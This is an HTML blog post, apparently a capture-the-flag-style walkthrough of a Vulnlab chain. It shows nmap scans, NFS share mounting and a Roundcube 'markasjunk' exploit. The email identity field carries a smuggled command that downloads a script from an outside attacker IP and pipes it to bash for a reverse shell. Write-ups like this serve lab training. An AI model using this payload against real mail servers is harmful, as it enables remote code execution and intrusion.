<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Hybrid (Chain Easy) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Hybrid is a Chain mixed with a linux and windows machine. Starts off with Roundcube Webmail on http, using alias identities your able to force..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Hybrid (Chain Easy)",
  "url": "https://d34db33fb04h.github.io/2025/04/29/Hybrid/",
  "image": "https://d34db33fb04h.github.io/img/hybrid.jpg",
  "datePublished": "2025-04-29T18:00:37.000Z",
  "dateModified": "2025-04-29T20:12:38.859Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/04/29/Hybrid/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Hybrid (Chain Easy)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/chains/"><i class="fa-fw fas fa-chain"></i><span> Chains</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Hybrid (Chain Easy)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/chains/"><i class="fa-fw fas fa-chain"></i><span> Chains</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Hybrid (Chain Easy)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-04-29T18:00:37.000Z" title="Created 2025-04-29 13:00:37">2025-04-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-29T20:12:38.859Z" title="Updated 2025-04-29 15:12:38">2025-04-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/chains/">chains</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Hybrid is a Chain mixed with a linux and windows machine. Starts off with Roundcube Webmail on http, using alias identities your able to force command injection leading to a reverse shell. The once on the box your find <code>/etc/exports</code> enabling <em>rw</em> for <code>/opt/share</code>, allowing for privilege escalation to user <em>peter</em>. Once done, you tunnel through to find a vulnerable ESC1 template allowing for <code>Domain Computers</code> to supply enrollees allowing for privilege escalation to <code>Administrator</code>.</p>
<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><p>Scan on to IPs.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.160.197</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line">Not shown: 988 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-11 15:34:13Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class="line">| Issuer: commonName=hybrid-DC01-CA</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-07-17T16:39:23</span><br><span class="line">| Not valid after:  2025-07-17T16:39:23</span><br><span class="line">| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a</span><br><span class="line">|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class="line">| Issuer: commonName=hybrid-DC01-CA</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-07-17T16:39:23</span><br><span class="line">| Not valid after:  2025-07-17T16:39:23</span><br><span class="line">| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a</span><br><span class="line">|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class="line">| Issuer: commonName=hybrid-DC01-CA</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-07-17T16:39:23</span><br><span class="line">| Not valid after:  2025-07-17T16:39:23</span><br><span class="line">| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a</span><br><span class="line">|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class="line">| Issuer: commonName=hybrid-DC01-CA</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-07-17T16:39:23</span><br><span class="line">| Not valid after:  2025-07-17T16:39:23</span><br><span class="line">| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a</span><br><span class="line">|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: HYBRID</span><br><span class="line">|   NetBIOS_Domain_Name: HYBRID</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: hybrid.vl</span><br><span class="line">|   DNS_Computer_Name: dc01.hybrid.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2024-11-11T15:36:56+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class="line">| Issuer: commonName=dc01.hybrid.vl</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-07-16T16:48:12</span><br><span class="line">| Not valid after:  2025-01-15T16:48:12</span><br><span class="line">| MD5:   d7ed:81b4:60b7:109f:56e3:7901:e081:2237</span><br><span class="line">|_SHA-1: 95e3:a4cd:6bc8:3de4:cd9a:92c3:10e5:4e58:9951:81a4</span><br><span class="line">|_ssl-date: 2024-11-11T15:37:36+00:00; 0s from scanner time.</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-11-11T15:36:56</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.160.198</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line">Not shown: 990 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)</span><br><span class="line">|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)</span><br><span class="line">25/tcp   open  smtp?</span><br><span class="line">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class="line">80/tcp   open  http        nginx 1.18.0 (Ubuntu)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-title: Redirecting...</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">110/tcp  open  pop3        Dovecot pop3d</span><br><span class="line">| ssl-cert: Subject: commonName=mail01</span><br><span class="line">| Subject Alternative Name: DNS:mail01</span><br><span class="line">| Issuer: commonName=mail01</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2023-06-17T13:20:17</span><br><span class="line">| Not valid after:  2033-06-14T13:20:17</span><br><span class="line">| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29</span><br><span class="line">|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_pop3-capabilities: CAPA UIDL SASL RESP-CODES STLS AUTH-RESP-CODE PIPELINING TOP</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      35943/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      38361/tcp   mountd</span><br><span class="line">|   100005  1,2,3      42047/udp   mountd</span><br><span class="line">|   100005  1,2,3      55681/udp6  mountd</span><br><span class="line">|   100021  1,3,4      32856/udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      36789/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      37737/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      60997/udp6  nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|_  100227  3           2049/tcp6  nfs_acl</span><br><span class="line">143/tcp  open  imap        Dovecot imapd (Ubuntu)</span><br><span class="line">|_imap-capabilities: more post-login LOGIN-REFERRALS OK LITERAL+ IDLE IMAP4rev1 capabilities SASL-IR ID ENABLE have Pre-login LOGINDISABLEDA0001 listed STARTTLS</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=mail01</span><br><span class="line">| Subject Alternative Name: DNS:mail01</span><br><span class="line">| Issuer: commonName=mail01</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2023-06-17T13:20:17</span><br><span class="line">| Not valid after:  2033-06-14T13:20:17</span><br><span class="line">| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29</span><br><span class="line">|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008</span><br><span class="line">587/tcp  open  submission?</span><br><span class="line">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class="line">993/tcp  open  ssl/imap    Dovecot imapd (Ubuntu)</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_imap-capabilities: more post-login LOGIN-REFERRALS OK LITERAL+ IDLE IMAP4rev1 AUTH=LOGINA0001 SASL-IR AUTH=PLAIN ENABLE have capabilities Pre-login listed ID</span><br><span class="line">| ssl-cert: Subject: commonName=mail01</span><br><span class="line">| Subject Alternative Name: DNS:mail01</span><br><span class="line">| Issuer: commonName=mail01</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2023-06-17T13:20:17</span><br><span class="line">| Not valid after:  2033-06-14T13:20:17</span><br><span class="line">| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29</span><br><span class="line">|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008</span><br><span class="line">995/tcp  open  ssl/pop3    Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: CAPA UIDL SASL(PLAIN LOGIN) RESP-CODES USER AUTH-RESP-CODE PIPELINING TOP</span><br><span class="line">| ssl-cert: Subject: commonName=mail01</span><br><span class="line">| Subject Alternative Name: DNS:mail01</span><br><span class="line">| Issuer: commonName=mail01</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2023-06-17T13:20:17</span><br><span class="line">| Not valid after:  2033-06-14T13:20:17</span><br><span class="line">| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29</span><br><span class="line">|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">2049/tcp open  nfs_acl     3 (RPC #100227)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>We have two targets, lets focus on the linux machine first since the other is unreachable.</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>Going to the IP address redirectes us to <code>mail01.hybrid.vl</code> and looks to be Roundcube Webmail. Not much we can do at the moment. We’ll come back 👍.</p>
<p><img src="/img/roundlogin.png"></p>
<h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h2><p>We did have a port 2049 NFS open we can check.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ showmount -e 10.10.168.102</span><br><span class="line">Export list <span class="keyword">for</span> 10.10.168.102:</span><br><span class="line">/opt/share *</span><br></pre></td></tr></table></figure>

<p>Mounting to it we see <code>backup.tar.gz</code>. We copy it and unzip to find some configs and other directorys.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> mount.nfs -o rw 10.10.139.134:/opt/share tmpMnt/ </span><br><span class="line"></span><br><span class="line">$ tree backup             </span><br><span class="line">backup</span><br><span class="line">├── backup.tar.gz</span><br><span class="line">├── etc</span><br><span class="line">│   ├── dovecot</span><br><span class="line">│   │   └── dovecot-users</span><br><span class="line">│   ├── passwd</span><br><span class="line">│   ├── postfix</span><br><span class="line">│   │   └── main.cf</span><br><span class="line">│   └── sssd</span><br><span class="line">│       └── sssd.conf</span><br><span class="line">└── opt</span><br><span class="line">    └── certs</span><br><span class="line">        └── hybrid.vl</span><br><span class="line">            ├── fullchain.pem</span><br><span class="line">            └── privkey.pem</span><br><span class="line"></span><br><span class="line">8 directories, 7 files</span><br></pre></td></tr></table></figure>
<p><img src="/img/facepalm.gif"><br>This reveals some users from the <code>dovecot-users</code> file.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@hybrid.vl:&#123;plain&#125;&lt;SNIP&gt;</span><br><span class="line">peter.turner@hybrid.vl:&#123;plain&#125;&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>We can try these to login with RoundCube.</p>
<h2 id="RoundCube-Webmail"><a href="#RoundCube-Webmail" class="headerlink" title="RoundCube Webmail"></a>RoundCube Webmail</h2><p>Using the credentials we’re able to login with both accounts. Looking at what version is installed we see more plugins install as well, one that sticks out is <code>markasjunk</code>. </p>
<p><img src="/img/cubeit.png"></p>
<p>We can look over this <a target="_blank" rel="noopener" href="https://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/">blog</a> and see how it works. So simply, we need to use peter’s account to send and email to admin and receive a shell back.</p>
<p>We need to change his email a bit, or his identity, to <code>peter.turner&amp;curl$&#123;IFS&#125;-o$&#123;IFS&#125;/tmp/x$&#123;IFS&#125;10.8.4.29/x$&#123;IFS&#125;|$&#123;IFS&#125;bash&amp;@hybrid.vl</code>. </p>
<p><img src="/img/curlingIFS.png"></p>
<p>Then we send an email to admin, select it, and mark as junk. Then watch the magic happen. 🎇✨🎇<br><em>(we hope)</em> 🤨</p>
<p><img src="/img/Airplane.gif"></p>
